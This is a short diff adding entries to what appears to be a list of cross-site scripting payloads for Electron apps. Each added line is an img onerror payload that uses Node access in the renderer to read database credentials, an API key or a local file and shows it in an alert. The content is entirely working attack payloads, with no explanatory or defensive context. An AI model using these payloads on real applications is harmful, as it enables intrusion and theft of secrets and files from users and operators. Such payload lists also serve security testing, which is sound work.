@@ -17,3 +17,8 @@
 
 <img src=x onerror="alert(JSON.stringify(process.memoryUsage()));">
 
+<img src=x onerror="alert(JSON.stringify(require('electron').remote.getGlobal('sharedObject').databaseCredentials));">
+
+<img src=x onerror="alert(require('electron').remote.getGlobal('sharedObject').apiKey); ">
+
+<img src=x onerror="alert(require('fs').readFileSync('/path/to/sensitive/file', 'utf8'));">
